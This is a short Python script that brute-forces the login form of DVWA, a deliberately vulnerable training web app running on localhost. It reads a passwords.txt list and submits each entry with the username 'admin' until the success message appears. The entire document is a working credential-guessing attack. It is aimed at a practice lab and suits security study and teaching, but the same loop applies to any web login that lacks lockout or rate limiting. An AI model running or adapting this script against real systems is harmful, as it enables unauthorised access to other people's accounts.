import requests

# DVWA login URL
url = "http://localhost:89/vulnerabilities/brute/"

# Username and password list
username = "admin"
password_file = "passwords.txt"

# Success message to check for upon correct login
success_message = "Welcome to the password protected area"

# Read passwords from file
with open(password_file, "r") as file:
    passwords = file.read().splitlines()

for password in passwords:
    # Data to send in the GET request
    params = {
        "username": username,
        "password": password,
        "Login": "Login"
    }

    # Send the GET request to DVWA
    response = requests.get(url, params=params)

    # Check if the success message is in the response text
    if success_message in response.text:
        print(f"Correct password found: {password}")
        break
    else:
        print(f"Tried {password}: Login failed.")
